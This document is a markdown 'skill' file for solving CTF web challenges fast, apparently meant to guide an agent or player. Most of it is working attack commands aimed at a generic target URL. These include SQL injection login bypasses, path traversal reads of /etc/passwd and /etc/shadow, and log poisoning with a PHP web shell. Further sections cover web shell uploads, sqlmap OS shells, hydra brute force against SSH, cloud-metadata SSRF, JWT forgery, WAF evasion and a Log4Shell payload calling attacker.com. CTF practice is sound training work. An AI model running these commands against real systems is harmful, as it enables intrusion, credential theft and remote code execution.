# CTF Web Exploitation Skill

## Speed-First Approach: Solve web challenges in <10 minutes

### Phase 1: Instant Recon (<2 minutes)
```bash
URL=$1

# Headers and cookies
curl -sI $URL
curl -sI $URL -c /tmp/cookies.txt

# Quick directory check
for f in robots.txt .git/config .env admin flag flag.txt index.html backup.zip source.zip .DS_Store .htaccess web.config sitemap.xml crossdomain.xml; do
  code=$(curl -s -o /dev/null -w '%{http_code}' $URL/$f)
  [ "$code" != "404" ] && echo "[+] $f → $code"
done

# Source code check
curl -s $URL | grep -i 'flag\|hidden\|secret\|admin\|password'

# Technology fingerprint
curl -sI $URL | grep -i 'server\|x-powered-by\|set-cookie\|x-aspnet\|x-runtime'

# JavaScript analysis
curl -s $URL | grep -oE 'src="[^"]*\.js"' | head -10
curl -s $URL | grep -oiE '(eval|document\.cookie|localStorage|sessionStorage)' | sort -u
```

### Phase 2: Pattern Recognition (<5 minutes)
```
MATCH challenge to known patterns:
├── Login form? → SQLi or default creds (30 seconds to try)
├── User profile page? → IDOR (change user ID)
├── File download? → Path traversal (../../../etc/passwd)
├── Search box? → XSS or SQLi
├── API endpoint? → Mass assignment or BOLA
├── File upload? → Bypass extension filter
├── Admin panel? → Force browsing or default creds
├── JSON API? → Prototype pollution
├── WordPress? → WPScan enumeration
├── SSTI indicators ({{7*7}}) → Template injection
├── JWT token? → Algorithm confusion, none attack
├── SSRF indicator (fetch/proxy URL) → Internal network scan
├── Race condition possible? → Concurrent requests
└── No obvious pattern? → Directory brute force + source code review
```

### Phase 3: Solve and Submit
```
IF flag found → submit immediately
ELSE → move to next challenge (come back later if stuck)
```

## One-Liner Solvers

### SQL Injection Quick Bypass
```bash
# Login bypass - try all variations
curl -s -X POST "$URL/login" \
  -d "username=admin'--&password=anything" \
  -d "username=admin'%23&password=anything" \
  -d "username=admin'/*&password=anything*/" \
  -d "username=admin'||'1'='1&password=anything" \
  -d "username=admin' OR '1'='1&password=anything"

# SQLi in parameter - quick test
curl -s "$URL/page?id=1' OR '1'='1"
curl -s "$URL/page?id=1' OR '1'='1'--"
curl -s "$URL/page?id=1' OR '1'='1'/*"
```

### IDOR Enumeration
```bash
# Try different ID formats
for id in {1..50} admin root test user administrator; do
  curl -s "$URL/api/user/$id" | grep -v 'error\|null' | head -1
done

# Try IDOR with different keys
for key in id user_id uid userid account_id; do
  curl -s "$URL/api?$key=1" | head -1
done
```

### LFI Traversal
```bash
# Quick LFI test
for path in "../" "../../" "../../../" "../../../../"; do
  curl -s "$URL/?page=${path}etc/passwd" | grep -q root && echo "LFI with $path"
done

# PHP filter (get source code)
curl -s "$URL/?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d

# Common LFI paths
for f in /etc/passwd /etc/shadow /etc/hosts /proc/self/environ /proc/version; do
  curl -s "$URL/?page=../../../../../../$f" | head -3
done

# LFI to RCE via log poisoning
curl -s "$URL/?page=/var/log/apache2/access.log"  # Check if logs accessible
curl -s -H "User-Agent: <?php system(\$_GET['c']); ?>" "$URL/?page=/var/log/apache2/access.log"  # Poison log
curl -s "$URL/?page=/var/log/apache2/access.log&c=id"  # Execute command
```

### XSS Detection
```bash
# Quick XSS test
curl -s "$URL/search?q=<script>alert(1)</script>" | grep -o '<script>alert(1)</script>'

# Check for DOM XSS sources
curl -s $URL | grep -oE '(location\.hash|document\.URL|document\.referrer|window\.name|document\.cookie)' | sort -u

# Check for reflected parameters
curl -s "$URL/?test=PROBE123" | grep -q PROBE123 && echo "Reflected parameter found"
```

### File Upload Bypass
```bash
# Try different extensions
for ext in php php3 php4 php5 phtml pht phar; do
  echo "<?php system(\$_GET['c']); ?>" > shell.$ext
  curl -s -F "file=@shell.$ext" $URL/upload | head -1
done

# Try Content-Type bypass
curl -s -F "file=@shell.php;type=image/jpeg" $URL/upload

# Try double extension
curl -s -F "file=@shell.php.jpg" $URL/upload

# Try null byte
curl -s -F "file=@shell.php%00.jpg" $URL/upload
```

## Fast Attack Templates

### SQLMap Automation
```bash
# Quick SQLi test and dump
sqlmap -u "$URL/?id=1" --batch --dump --threads=10 --risk=3 --level=3

# Login form SQLi
sqlmap -u "$URL/login" --data="username=admin&password=pass" \
  --batch --dump --threads=10

# With cookie (authenticated)
sqlmap -u "$URL/?id=1" --cookie="session=abc123" --batch --dump

# OS shell
sqlmap -u "$URL/?id=1" --os-shell --batch

# Read file
sqlmap -u "$URL/?id=1" --file-read=/etc/passwd --batch
```

### ffuf Speed Scan
```bash
# Common web files (fast)
ffuf -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403 -s

# Directory listing
ffuf -u $URL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -mc 200 -s

# Parameter discovery
ffuf -u "$URL/?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs 0

# Subdomain enumeration
ffuf -u http://FUZZ.$DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200 -fs 0
```

### Hydra Brute Force
```bash
# Login brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt $URL http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://$URL
```

### Nikto Quick Scan
```bash
nikto -h $URL -Tuning x6 -maxtime 60s
nikto -h $URL -Plugin robots
nikto -h $URL -Plugin cgi
```

## OWASP Top 10 Quick Checks

### A01: Broken Access Control
```bash
# Force browsing to admin pages
for path in /admin /admin/ /dashboard /panel /manage /console /debug /api/admin; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "$URL$path")
  [ "$code" != "404" ] && echo "[+] $path → $code"
done

# IDOR on different endpoints
for endpoint in /api/user/ /api/users/ /api/account/ /api/profile/; do
  for id in 1 2 3 admin; do
    curl -s "$URL$endpoint$id" | grep -v 'error\|null' | head -1
  done
done
```

### A02: Cryptographic Failures
```bash
# Check for weak hashing
curl -s $URL/robots.txt | grep -i 'md5\|sha1\|des'

# Check for hardcoded credentials in source
curl -s $URL | grep -i 'password\|secret\|key\|token' | grep -v 'placeholder\|example'
```

### A03: Injection
```bash
# Command injection quick test
curl -s "$URL/?cmd=;id" | grep -i 'uid='
curl -s "$URL/?cmd=|id"
curl -s "$URL/?cmd=\$(id)"

# LDAP injection
curl -s "$URL/login" -d "username=*)(objectClass=*)&password=x"

# NoSQL injection
curl -s "$URL/login" -H "Content-Type: application/json" \
  -d '{"username":{"$gt":""},"password":{"$gt":""}}'
```

### A05: Security Misconfiguration
```bash
# Check for default credentials
for cred in "admin:admin" "admin:password" "admin:123456" "root:root" "test:test"; do
  user=$(echo $cred | cut -d: -f1)
  pass=$(echo $cred | cut -d: -f2)
  curl -s -X POST "$URL/login" -d "username=$user&password=$pass" | grep -v 'incorrect\|invalid'
done

# Check for verbose error messages
curl -s "$URL/nonexistent" | grep -i 'error\|exception\|stack trace'
```

### A07: Authentication Failures
```bash
# Test for username enumeration
curl -s -X POST "$URL/login" -d "username=admin&password=wrong" > /tmp/admin.txt
curl -s -X POST "$URL/login" -d "username=nonexistent&password=wrong" > /tmp/fake.txt
diff /tmp/admin.txt /tmp/fake.txt

# Rate limiting test
for i in $(seq 1 10); do
  curl -s -X POST "$URL/login" -d "username=admin&password=wrong" -o /dev/null -w '%{http_code}\n'
done
```

### A08: Software and Data Integrity Failures
```bash
# Check for outdated software
curl -sI $URL | grep -i 'server\|x-powered-by'

# Check for known vulnerable paths
for path in /wp-login.php /wp-admin/ /administrator/ /phpmyadmin/ /admin.php; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "$URL$path")
  [ "$code" != "404" ] && echo "[+] $path → $code"
done
```

### A10: Server-Side Request Forgery (SSRF)
```bash
# Quick SSRF test
curl -s "$URL/fetch?url=http://127.0.0.1:22"
curl -s "$URL/proxy?target=http://169.254.169.254/latest/meta-data/"
curl -s "$URL/ssrf?url=http://localhost:3306"

# DNS rebinding
curl -s "$URL/fetch?url=http://rebind.nu"
```

## Advanced Web Attack Patterns

### JWT Attacks
```bash
# None algorithm attack
echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_'
echo -n '{"user":"admin"}' | base64 -w0 | tr '+/' '-_'

# Weak secret (brute force)
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Key confusion (RS256 → HS256)
openssl rsa -pubin -in pubkey.pem -outform PEM > pubkey.pem.txt
hashcat -m 16500 jwt.txt pubkey.pem.txt
```

### Prototype Pollution
```bash
curl -s -X POST "$URL/api/merge" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'

curl -s "$URL/api/user?__proto__[isAdmin]=true"
```

### SSTI (Server-Side Template Injection)
```bash
# Quick SSTI test
curl -s "$URL/?name={{7*7}}"
curl -s "$URL/?name=${7*7}"
curl -s "$URL/?name=<%= 7*7 %>"

# If 49 is returned, it's vulnerable
# Jinja2: {% import os %}{{ os.popen('id').read() }}
# Twig: {{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
```

### Race Conditions
```bash
# Quick race condition test
for i in $(seq 1 20); do
  curl -s -X POST "$URL/redeem" -d "code=GIFT" &
done
wait
```

### File Upload to RCE
```bash
# GIF89a header bypass
echo "GIF89a<?php system(\$_GET['c']); ?>" > shell.php
curl -s -F "file=@shell.php" $URL/upload

# Double extension
cp shell.php shell.php.jpg
curl -s -F "file=@shell.php.jpg" $URL/upload

# .htaccess upload
echo "AddType application/x-httpd-php .jpg" > .htaccess
curl -s -F "file=@.htaccess" $URL/upload
curl -s -F "file=@shell.jpg" $URL/upload
curl -s "$URL/uploads/shell.jpg?c=id"
```

### WordPress Attacks
```bash
# WPScan enumeration
wpscan --url $URL --enumerate vp,vt,u

# Default creds
wpscan --url $URL --passwords /usr/share/wordlists/rockyou.txt --usernames admin

# XML-RPC brute force
wpscan --url $URL --passwords /usr/share/wordlists/rockyou.txt --usernames admin --wp-content-dir wp-content
```

## Speed Hacks

### Parallel Requests
```bash
# Run multiple checks simultaneously
(echo "=== robots ===" && curl -s $URL/robots.txt) &
(echo "=== .git ===" && curl -s $URL/.git/config) &
(echo "=== admin ===" && curl -s -o /dev/null -w '%{http_code}' $URL/admin) &
(echo "=== env ===" && curl -s $URL/.env) &
wait
```

### Cookie Session Management
```bash
curl -s -c cookies.txt -b cookies.txt $URL/login -d "username=admin&password=admin"
curl -s -b cookies.txt $URL/admin/dashboard
```

### Quick Encoding/Decoding
```bash
# URL decode
python3 -c "import urllib.parse; print(urllib.parse.unquote('%7B%22flag%22%3A%22test%22%7D'))"

# HTML decode
python3 -c "import html; print(html.unescape('&lt;script&gt;'))"

# Base64 decode
echo "eyJmbGFnIjoiVEVTVCJ9" | base64 -d

# JWT decode (without verification)
echo "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature" | cut -d. -f2 | base64 -d
```

## CTF Web Pattern Database

### Pattern: Login + Admin Access
```
Approach:
1. SQLi on login form (admin'-- OR admin' OR '1'='1)
2. Default credentials (admin:admin, admin:password, admin:123456)
3. IDOR on password reset (change email parameter)
4. Bruteforce (hydra with common passwords)
5. Cookie manipulation (role=admin, isAdmin=true)
```

### Pattern: File Download + Flag
```
Approach:
1. Path traversal (../../../etc/passwd, ../../flag.txt)
2. Symlink attack (if upload available)
3. PHP filter (php://filter/convert.base64-encode/resource=flag.php)
4. ZIP slip (upload malicious zip)
```

### Pattern: User Enumeration
```
Approach:
1. Compare responses for existing vs non-existing users
2. Timing differences (hashing takes longer for valid users)
3. Error messages differ
4. Try IDOR on user endpoints
```

### Pattern: WAF Detection + Bypass
```
Approach:
1. Detect WAF: curl -s -I $URL | grep -i 'waf\|cloudflare\|akamai'
2. Bypass techniques:
   - Case variation: SeLeCt instead of SELECT
   - Comments: SEL/**/ECT instead of SELECT
   - Encoding: %53%45%4C%45%43%54
   - Double encoding: %2553%2545%254C%2545%2543%2554
   - Alternative syntax: /*!50000SELECT*/ instead of SELECT
   - Parameter pollution: id=1&id=1' OR '1'='1
```

### Pattern: CVE Exploitation
```
Detection: Check server version headers
Common CVEs in CTFs:
- Log4Shell (CVE-2021-44228): ${jndi:ldap://attacker.com}
- WinRAR (CVE-2023-38831): Crafted archive with script
- Openfire (CVE-2023-32315): Admin console RCE
- Confluence (CVE-2023-22515): Authentication bypass
- Spring4Shell (CVE-2022-22965): Java deserialization
```

### Pattern: Malware Delivery Vectors
```
Phishing email indicators:
- Macro-enabled Office documents (.docm, .xlsm)
- LNK files masquerading as documents
- Password-protected archives (password in email)
- Double extensions (document.pdf.exe)
- USB drops with autorun
```

## Speed Metrics
```
Average solve times (target):
- SQL injection login bypass: <2 minutes
- IDOR enumeration: <5 minutes
- Path traversal: <3 minutes
- XSS reflected: <2 minutes
- File upload bypass: <5 minutes
- JWT attack: <10 minutes
- SSRF: <5 minutes
- Complex chain: <15 minutes
```
